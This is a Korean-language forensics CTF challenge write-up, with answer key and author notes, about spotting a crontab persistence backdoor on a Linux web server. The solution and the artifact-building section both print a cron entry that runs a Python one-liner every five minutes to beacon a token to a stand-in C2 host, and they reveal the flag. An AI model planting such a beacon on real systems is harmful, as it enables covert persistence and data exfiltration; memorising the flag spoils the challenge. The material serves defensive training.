---
title: 리눅스 크론탭 영속성 백도어 (Crontab Persistence Analysis)
created: 2026-06-28
updated: 2026-06-28
type: ctf-challenge
tags: [ctf, ctf-challenge, forensics, linux, crontab, persistence, backdoor, cron]
confidence: high
---

# 리눅스 크론탭 영속성 백도어 (Crontab Persistence Analysis)

> **난이도**: 초급  
> **소요 시간**: 15~20분  
> **참고 picoCTF?**: 리눅스 예약 작업 관리 및 영속성 기법 식별 (Crontab 분석)

## 1. 배경 시나리오
사내 중요 리눅스 웹서버에 주기적으로 비인가 셸이 구동되어 내부 시스템 정보를 외부로 반출하고 있음이 방화벽 로그를 통해 확인되었습니다. 침해사고 조사팀은 공격자가 서버 권한을 잃더라도 지속적인 제어 권한을 유지하기 위해 리눅스 스케줄러인 **크론탭(Crontab)** 설정을 조작해 둔 것으로 판단하고 관련 아티팩트를 수집했습니다. 수집된 시스템 및 사용자 개별 크론 파일이 담긴 `crontabs.zip`을 획득했습니다. 이 아카이브 내부의 크론 일정을 검토하여 **공격자가 등록해 둔 주기적 통신 스크립트 속의 플래그**를 획득하십시오.

## 2. 제공 파일
* `crontabs.zip` (리눅스 시스템 및 개별 사용자 크론 설정 파일을 수집한 압축 파일)
  * 포함 파일: `crontab_root` (루트 계정 크론 파일), `crontab_user` (일반 사용자 계정 크론 파일)

## 3. 문제 목표
리눅스의 주기적 작업 예약 엔진인 Cron의 시스템 구성 파일 위치(`/etc/crontab`, `/var/spool/cron/crontabs/`)와 설정 정의 필드(분, 시, 일, 월, 요일, 실행계정, 명령줄) 명세를 이해하고, 추가된 비정상 악성 명령을 격리 및 분석합니다.

## 4. 의도한 풀이 흐름
1. **아카이브 압축 해제**:
   * 제공된 `crontabs.zip` 파일의 압축을 해제하고 추출된 크론 파일들을 확인합니다.
2. **크론 파일 정적 뷰 분석**:
   * 각 텍스트 파일(`crontab_root`, `crontab_user`)을 열어 기존 시스템 예약 작업(일반적으로 디스크 정리, 타임 동기화 등) 외에 추가된 외래 명령줄을 검출합니다.
   * `crontab_user` 파일의 최하단부에서 매 5분마다 파이썬 한 줄 명령어(One-liner)를 활용해 C2 서버로 토큰을 릴레이 송출하는 다음의 악성 항목을 식별합니다:
     ```text
     # 5분 간격으로 C2 상태 체크 보고 수행
     */5 * * * * /usr/bin/python3 -c "import urllib.request; urllib.request.urlopen('http://c2-server.net/heartbeat?token=picoCTF{cront4b_sh3ll_p3rsistenc3_check}')"
     ```
3. **플래그 획득**:
   * 파이썬 스크립트의 URL 파라미터 `token` 값에 직접 매핑되어 있던 문자열을 추출해 최종 플래그로 획득합니다:
     `picoCTF{cront4b_sh3ll_p3rsistenc3_check}`

## 5. 정답(플래그) 규칙 및 예시
* **플래그 형식**: `picoCTF{<flag_string>}`
* **예시**: `picoCTF{cront4b_sh3ll_p3rsistenc3_check}`

## 6. 출제자 노트 & 파일 제작 가이드
* **아티팩트 제작 방법**:
  1. 리눅스 가상 머신에서 크론탭 편집 세션을 기동합니다:
     `crontab -e`
  2. 파일 하단에 플래그 매개변수가 수록된 모의 C2 비컨 코드를 입력합니다:
     `*/5 * * * * /usr/bin/python3 -c "import urllib.request; urllib.request.urlopen('http://c2-server.net/heartbeat?token=picoCTF{cront4b_sh3ll_p3rsistenc3_check}')"`
  3. 로컬 크론탭 스풀 디렉터리(`/var/spool/cron/crontabs/`)로 이동하여 수정된 사용자 크론 바이너리/텍스트를 획득하고, 이를 `crontab_user`로 작명합니다.
  4. 루트 시스템 크론(`/etc/crontab`) 파일도 복제하여 `crontab_root`로 구성한 뒤, 두 파일을 묶어 `crontabs.zip`으로 아카이빙합니다.
* **출제 포인트**: 
  * 리눅스 침해 조사 시 영속성 유지(Persistence Mechanism)의 단골 기법인 크론 스케줄링 조작 흔적을 탐지하고, 일시/주기 설정 필드를 정석대로 디코딩하여 위협 인자를 격리하는 기본 능력을 기릅니다.

## 7. 트러블슈팅 및 힌트
* **Q. 리눅스의 크론 관련 파일들은 어떤 경로에 분산되어 존재하나요?**
  * A. 침해 사고 조사 시 반드시 조회해야 하는 크론 관련 경로는 다음과 같습니다:
    * `/etc/crontab`: 시스템 기본 크론탭 파일
    * `/etc/cron.d/`: 패키지나 관리자가 임의 추가하는 시스템 크론 작업 폴더
    * `/etc/cron.daily/`, `/etc/cron.hourly/`, `/etc/cron.monthly/`: 주기별 일괄 실행 스크립트 배치 폴더
    * `/var/spool/cron/crontabs/`: 개별 사용자 계정들이 `crontab -e` 명령으로 독립 생성한 사용자별 작업 폴더
* **Q. 크론의 일정 필드 중 */5 * * * * 는 어떤 주기로 실행됨을 의미하나요?**
  * A. 각 위치는 `[분] [시] [일] [월] [요일]`을 의미합니다. 따라서 `*/5`는 매 5분마다, 나머지 필드의 `*`는 매시간, 매일, 매월, 매요일을 뜻하므로 최종적으로 "매 5분 정각"마다 반복 수행하라는 설정입니다.

## 8. 학습 포인트
* **리눅스 크론(Cron) 서비스 포렌식**: 주기 스케줄러의 작동 아키텍처 및 시스템/사용자 레벨 크론 설정 파일 배치를 완벽히 학습합니다.
* **영속성 위협 분석**: 재부팅이나 관리자 모니터링을 우회해 주기적으로 백도어 커넥션을 여는 크론탭 기반 우회 기법의 탐지 절차를 확립합니다.
